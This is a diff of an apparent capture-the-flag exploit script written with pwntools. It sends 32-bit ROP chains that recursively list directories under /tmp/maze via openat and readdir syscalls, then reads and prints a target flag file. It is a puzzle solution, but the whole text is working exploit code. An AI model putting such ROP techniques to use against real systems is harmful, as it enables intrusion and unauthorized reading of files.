@@ -60,92 +60,99 @@ continue
 
 MAX_BRANCH = 12 # take a look at the magestic find-max-branch.sh script
 RECV_DIRNAME_BUF_SIZE = 128
+OFF_NAME_DIRENT = 10
 
-main = 0x13371F86
-read_buf = 0x13371f47
-filename_buf = 0x13375D60
-dirent = 0x13375000 # need to be aligned
-sys_read = 0x133723AF
-sys_openat = 0x133725d0
-sys_write = 0x133723C9
-sys_call = 0x1337233E
-sys_close = 0x133723E3
-root_dir = b"/tmp/maze/entry"
-target = b"triwizard_cup"
+MAIN = 0x13371F86
+READ_BUF = 0x13371f47
+FILENAME_BUFF = 0x13375D60
+DIRENT = 0x13375000 # need to be aligned
+SYS_READ = 0x133723AF
+SYS_OPENAT = 0x133725d0
+SYS_WRITE = 0x133723C9
+SYS_CALL = 0x1337233E
+SYS_CLOSE = 0x133723E3
+ROOT_DIR = b"/tmp/maze/entry"
+TARGET = b"triwizard_cup"
 dfd = 1
 
 def find(children, filename):
     global dfd
-    rop = ROP(exe)
 
     for child in children:
-        log.info(f"Searching in {child}")
+        rop = ROP(exe)
+        log.info((b"\t" * (dfd-1)).decode() + child.decode())
 
         if child == filename:
             log.success("Found flag file")
-            break
-            # return
-            # TODO: read and print flag
 
-        rop.call(sys_read, [0, filename_buf, 100]) # zero out memory
-        rop.call(sys_read, [0, filename_buf, len(child)])
+            rop.call(SYS_READ, [0, FILENAME_BUFF, 100]) # zero out memory of the filename buffer
+            rop.call(SYS_READ, [0, FILENAME_BUFF, len(child)])
+            rop.call(SYS_OPENAT, [dfd, FILENAME_BUFF, constants.O_RDONLY, 0])   
+            dfd += 1
+            rop.call(SYS_READ, [dfd, FILENAME_BUFF, 255])
+            rop.call(SYS_WRITE, [1, FILENAME_BUFF, 255])
+            rop.call(SYS_CALL, [constants.SYS_exit, 0])
 
-        if child == root_dir:
-            rop.call(sys_openat, [constants.AT_FDCWD, filename_buf, constants.O_RDONLY, 0])
+            payload = rop.chain()
+
+            io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
+            io.send(b"\x00" * 100) # zero out the memory of the filename so we don't have to handle null terminated strings here
+            io.send(child)
+
+            print(io.recvuntil(b"\x00", drop=True).decode())
+            exit()
+
+
+        rop.call(SYS_READ, [0, FILENAME_BUFF, 100]) # zero out memory of the filename buffer
+        rop.call(SYS_READ, [0, FILENAME_BUFF, len(child)])
+
+        if child == ROOT_DIR:
+            rop.call(SYS_OPENAT, [constants.AT_FDCWD, FILENAME_BUFF, constants.O_RDONLY, 0])
         else:
-            rop.call(sys_openat, [dfd, filename_buf, constants.O_RDONLY, 0])   
+            rop.call(SYS_OPENAT, [dfd, FILENAME_BUFF, constants.O_RDONLY, 0])   
 
         dfd += 1
 
-        # rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0]) # ignore .
-        # rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0]) # ignore ..
-
         for i in range(MAX_BRANCH):
-            rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0])
-            rop.call(sys_write, [1, dirent, RECV_DIRNAME_BUF_SIZE])
+            rop.call(SYS_CALL, [constants.SYS_readdir, dfd, DIRENT, 0, 0, 0])
+            rop.call(SYS_WRITE, [1, DIRENT, RECV_DIRNAME_BUF_SIZE])
 
-        rop.raw(p32(read_buf))
-
+        rop.raw(p32(READ_BUF))
         payload = rop.chain()
-
-        # payload += p32(read_buf)
-        # TODO: close syscall of dir
 
         assert(len(payload) < 1025)
         io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
         io.send(b"\x00" * 100) # zero out the memory of the filename so we don't have to handle null terminated strings here
         io.send(child)
-        # io.send(b"\x00" * 100 * MAX_BRANCH)
 
         entries = set()
         for i in range(MAX_BRANCH):
             data = io.recv(RECV_DIRNAME_BUF_SIZE)
-            name_len= data[8]
-            name_start = 10
-            name_end = name_start + name_len
-            entries.add(data[name_start:name_end])
+            namlen = u16(data[8:10])
+            entries.add(data[OFF_NAME_DIRENT:OFF_NAME_DIRENT+namlen])
 
-        entries.pop()
         entries.remove(b".")
         entries.remove(b"..")
 
-        print(f"{entries=}")
         if entries:
-            find(entries, target)
+            find(entries, TARGET)
 
         rop = ROP(exe)
-        rop.call(sys_close, [dfd])
-        rop.raw(p32(read_buf))
+        rop.call(SYS_CLOSE, [dfd])
+        rop.raw(p32(READ_BUF))
         payload = rop.chain()
         io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
         dfd -= 1
 
+
+
+
 io = start()
 
 parent = set()
-parent.add(root_dir)
-print(parent)
-find(parent, target)
+parent.add(ROOT_DIR)
 
-io.interactive()
+find(parent, TARGET)
+
+io.close()
 
